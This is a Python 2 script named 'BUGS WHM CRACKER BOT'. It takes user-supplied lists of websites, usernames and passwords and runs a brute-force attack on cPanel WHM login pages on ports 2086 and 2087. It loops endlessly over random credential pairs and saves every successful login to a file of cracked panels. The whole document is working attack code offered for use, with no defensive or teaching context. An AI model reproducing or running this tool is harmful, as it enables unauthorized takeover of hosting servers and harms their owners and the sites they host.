#!/usr/bin/python
# -*- coding: utf-8 -*-

# ( -- IMPORTS -- ) #
import requests
from random import *
import random
import time

# ( -- LOGO * INFO -- ) #
bugs = '''
   ____  ____  _   _  ____ _____        ___   _ __  __       ____   ___ _____ 
  / __ \| __ )| | | |/ ___/ __\ \      / / | | |  \/  |     | __ ) / _ \_   _|
 / / _` |  _ \| | | | |  _\___ \ \ /\ / /| |_| | |\/| |_____|  _ \| | | || |  
| | (_| | |_) | |_| | |_| |___) \ V  V / |  _  | |  | |_____| |_) | |_| || |  
 \ \__,_|____/ \___/ \____|____/ \_/\_/  |_| |_|_|  |_|     |____/ \___/ |_|  
  \____/                                                                       
\n[$] BUGS WHM CRACKER BOT.
[$] URL = ("https://www.Brazzers.com/").
[$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''
#################################
# ( -- PROGRAMMED BY @BUGS -- ) #
#################################

# ( -- FULL API SCRIPT -- ) #

print bugs
print '>$ PLEASE MAKE YOUR LIST WEBSITES WITHOUT [https || http].'
print '>$ PLEASE MAKE YOUR WEBSITES LIST A CLEAN WEB LIKE [site.com].'
print ''

ips_list = raw_input('[X] ENTER YOUR WEBSITES LIST X> ')
users_list = raw_input('[X] ENTER YOUR USERS PATH TEXT X> ')
pass_list = raw_input('[X] ENTER YOUR PASSWORDS PATH TEXT X> ')

# ---------------------------- ## ---------------------------- #
try:
	users_file = open(users_list,'r').readlines()
	users_len = str(len(users_file))
	pass_file = open(pass_list,'r').readlines()
	pass_len = str(len(pass_file))
except (IOError, TypeError) as e:
	print '\n[X] PLEASE CHECK YOUR USERS || PASSWORDS PATH FILES NAMES.'
	time.sleep(10)
	print '[X] ARE YOU WAITING SOMEONE ? SCRIPT IS STOOPED AND WILL NOT WORK RESTART IT PLEASE.'
	time.sleep(1000000) # BUGS IS KIDDING :*
# ---------------------------- ## ---------------------------- #
print '\n[X] YOUR USERS NUM IS X> ' + users_len
print '[X] YOUR PASSWORDS NUM IS X> ' + pass_len
print ''
time.sleep(5)
# ---------------------------- ## ---------------------------- #

try:
	file = open(ips_list,'r').readlines()
	while True:
		print '\nSTARTED CHECKING ON [2086]'
		print '# ---------------------------- #\n'
		for ip in file:
			ip = ip.strip()
			f_whm_log = 'http://' + ip + ':2086/'
			try:
				f_req = requests.post(f_whm_log)
				if 'WHM Login' in f_req.content:
					print '\n[X] ' + f_whm_log + ' WORKING'
					print '[X] STARTED CRACKING ON ' + f_whm_log
					log_url = f_whm_log + 'login/?login_only=1'
					x_user = int(random.uniform(0, int(users_len) ))
					x_pass = int(random.uniform(0, int(pass_len) ))
					user = users_file[x_user]
					password = pass_file[x_pass]
					print '[X] LOGGIN IN WITH ' + log_url + ':' + user + ':' + password
					data = {
						'user': user,
						'pass': password,
						'goto_uri': '%2F'
					}
					request = requests.post(log_url, data=data)
					#print request.content
					if 'security_token' in request.content:
						print '[X] CRACKED SUCCESSFUL [LOGGED IN].'
						whms = open('VALID_WHMS.txt','a+')
						whms.write('[X] CRACKED SUCCESSFUL [LOGGED IN] ' + log_url + ':' + user + ':' + password + '\n')
						whms.close()
						time.sleep(3)
					else:
						print '[X] ERROR LOGGING IN WITH ' + log_url + ':' + user + ':' + password
				else:
					print '\n[X] ' + f_whm_log + ' XNOT WORKING'
			except (IOError, TypeError) as e:
				print '\n[X] ' + f_whm_log + ' NOT WORKING'

		# ---------------------------- ## ---------------------------- ## ---------------------------- #
		
		print '\nSTARTED CHECKING ON [2087]'
		print '# ---------------------------- #\n'
		for ip in file:
			ip = ip.strip()
			s_whm_log = 'http://' + ip + ':2087/'
			try:
				s_req = requests.post(s_whm_log)
				if 'WHM Login' in s_req.content:
					print '\n[X] ' + s_whm_log + ' WORKING'
					print '[X] STARTED CRACKING ON ' + s_whm_log
					log_url = s_whm_log + 'login/?login_only=1'
					x_user = int(random.uniform(0, int(users_len) ))
					x_pass = int(random.uniform(0, int(pass_len) ))
					user = users_file[x_user]
					password = pass_file[x_pass]
					print '[X] LOGGIN IN WITH ' + log_url + ':' + user + ':' + password
					data = {
						'user': user,
						'pass': password,
						'goto_uri': '%2F'
					}
					requestt = requests.post(log_url, data=data)
					#print request.content
					if 'security_token' in requestt.content:
						print '[X] CRACKED SUCCESSFUL [LOGGED IN].'
						whms = open('VALID_WHMS.txt','a+')
						whms.write('[X] CRACKED SUCCESSFUL [LOGGED IN] ' + log_url + ':' + user + ':' + password + '\n')
						whms.close()
						time.sleep(3)
					else:
						print '[X] ERROR LOGGING IN WITH ' + log_url + ':' + user + ':' + password
				else:
					print '\n[X] ' + s_whm_log + ' XNOT WORKING'
			except (IOError, TypeError) as e:
				print '\n[X] ' + s_whm_log + ' NOT WORKING'
			# ---------------------------- ## ---------------------------- ## ---------------------------- #
except (IOError, TypeError) as e:
	print '[X] PLEASE CHECK YOUR PATH FILE NAME.'